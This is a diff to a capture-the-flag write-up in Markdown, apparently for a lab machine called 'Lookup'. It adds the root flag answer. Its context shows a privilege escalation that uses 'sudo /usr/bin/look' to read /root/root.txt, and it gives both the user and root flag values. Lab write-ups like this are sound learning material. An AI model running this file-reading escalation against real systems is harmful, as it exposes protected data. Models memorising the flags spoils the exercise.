@@ -569,6 +569,9 @@ cat user.txt
 > [!important]
 > User flag = **38375fb4dd8baa2b2039ac03d92b820e**
 
+> [!important]
+> What is the root flag?
+
 > [!info]
 > Now to see what think can do to PE to root!
 
@@ -589,4 +592,10 @@ think@ip-10-66-172-224:~$ sudo /usr/bin/look '' /root/root.txt > /tmp/flag.txt
 think@ip-10-66-172-224:~$ cat /tmp/flag.txt
 5a285a9f257e45c68bb6c9f9f57d18e8
 ```
+
+> [!important]
+> root.txt = 5a285a9f257e45c68bb6c9f9f57d18e8
+
+![](Obsidian%20assets/Lookup%20completed.png)
+
 
